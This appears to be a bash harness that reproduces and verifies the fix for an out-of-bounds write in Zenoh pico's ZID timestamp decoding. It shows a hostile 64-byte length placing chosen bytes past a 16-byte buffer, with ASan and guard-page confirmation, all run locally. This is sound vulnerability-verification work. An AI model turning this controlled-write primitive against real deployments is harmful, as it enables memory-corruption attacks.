#!/usr/bin/env bash
# Source-bound Zenoh pico ZID timestamp OOB-write harness.
# All inputs are local argv values standing in for a decoded timestamp wire
# buffer; no Zenoh transport, peer or external system is contacted.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ulimit -c 0 2>/dev/null || true
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

pass=0; fail=0
check() {
    if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
    else echo "FAIL $1"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }
yes() { contains "$1" "$2" && echo 1 || echo 0; }

python3 gen_driver.py > "$OUT/gen.log" || exit 2
for t in vuln fixed vuln_asan fixed_asan; do
    case "$t" in
        vuln) gcc -O0 -g -o "$OUT/vuln" driver_vuln.c ;;
        fixed) gcc -O0 -g -o "$OUT/fixed" driver_fixed.c ;;
        vuln_asan) gcc -O0 -g -fsanitize=address -o "$OUT/vuln_asan" driver_vuln.c ;;
        fixed_asan) gcc -O0 -g -fsanitize=address -o "$OUT/fixed_asan" driver_fixed.c ;;
    esac || exit 2
done
V="$OUT/vuln"; F="$OUT/fixed"; VA="$OUT/vuln_asan"; FA="$OUT/fixed_asan"
HOSTILE=64    # attacker ZID length; exceeds the 16-byte id buffer
BENIGN=16     # maximum in-bounds ZID length
ZERO=0000000000000000
SENTINEL=a5a5a5a5a5a5a5a5

# Rung 1: v1.10.1 copies the attacker length byte and 64 wire bytes with no
# destination bound check; the stand-in stops before the wrapped memset limb.
r1=$($V collab $HOSTILE 65)
echo "$r1"
check "rung1 hostile ZID length accepted and copied" \
    "$(yes 'decode len=64 ret=0 jumped=1 rpos=66 copied=64' "$r1")"

# Rung 2: attacker-chosen wire bytes land at +16/+32/+48 past the 16-byte id.
ok=0
contains 'oob16=4141414141414141' "$r1" &&
contains 'oob32=4141414141414141' "$r1" &&
contains 'oob48=4141414141414141' "$r1" && ok=1
check "rung2 chosen bytes at three OOB offsets" "$ok"

# Rung 3: ASan traps the verbatim copy call in the pinned v1.10.1 source line.
"$VA" exact $HOSTILE 65 > "$OUT/asan.log" 2>&1
ac=$(cat "$OUT/asan.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 64' "$ac" &&
contains 'message_v1.10.1:80' "$ac" &&
contains '16-byte region' "$ac" && ok=1
check "rung3 ASan write at pinned message_v1.10.1:80" "$ok"

# Rung 4: a different chosen seed reads back byte-exact in the OOB region.
r4=$($V collab $HOSTILE 90)
echo "$r4"
ok=0
contains 'oob16=5a5a5a5a5a5a5a5a' "$r4" &&
contains 'oob32=5a5a5a5a5a5a5a5a' "$r4" &&
contains 'oob48=5a5a5a5a5a5a5a5a' "$r4" && ok=1
check "rung4 chosen 0x5a bytes at three OOB offsets" "$ok"

# Guard page: the first past-end store crosses into PROT_NONE.
( "$V" guard $HOSTILE 65 > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard page fault on first past-end write" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

# Fixed v1.10.2 rejects len > 16 before any copy; sentinel and cursor survive.
fc=$($F collab $HOSTILE 65)
echo "$fc"
ok=0
contains 'decode len=64 ret=-1 jumped=0 rpos=2 copied=0' "$fc" &&
contains "id0=$SENTINEL" "$fc" &&
contains "oob16=$ZERO" "$fc" && ok=1
check "fixed v1.10.2 rejects hostile ZID before copy" "$ok"

# The copied timestamp call chain also rejects through the verbatim caller.
chain=$($F chain $HOSTILE 65)
echo "$chain"
check "fixed timestamp chain rejects hostile ZID" \
    "$(yes 'chain ret=-1 rpos=2 valid=0' "$chain")"

fg=$($F collab $BENIGN 65)
echo "$fg"
ok=0
contains 'decode len=16 ret=0 jumped=0 rpos=18 copied=16' "$fg" &&
contains 'oob16=0000000000000000' "$fg" && ok=1
check "fixed accepts benign 16-byte ZID" "$ok"

"$FA" exact $HOSTILE 65 > "$OUT/fixed_asan_bad.log" 2>&1
"$FA" exact $BENIGN 65 > "$OUT/fixed_asan_good.log" 2>&1
"$VA" exact $BENIGN 65 > "$OUT/vuln_asan_benign.log" 2>&1
fb=$(cat "$OUT/fixed_asan_bad.log")
fgd=$(cat "$OUT/fixed_asan_good.log")
vb=$(cat "$OUT/vuln_asan_benign.log")
ok=0
! contains 'AddressSanitizer' "$fb" &&
! contains 'AddressSanitizer' "$fgd" &&
! contains 'AddressSanitizer' "$vb" && ok=1
check "ASan clean on fixed hostile/benign and vulnerable benign" "$ok"

# Determinism: two independent five-run groups, chosen bytes and pinned line.
group() {
    local h=""
    for i in 1 2 3 4 5; do
        h="$h$($V collab $HOSTILE 65)$($V guard $HOSTILE 65 2>/dev/null; echo "rc=$?")$($VA exact $HOSTILE 65 2>&1 | grep -oE 'WRITE of size [0-9]+|message_v1\.10\.1:[0-9]+' | tr '\n' ',')"
    done
    printf '%s' "$h" | sha256sum | cut -d' ' -f1
}
h1=$(group); h2=$(group)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
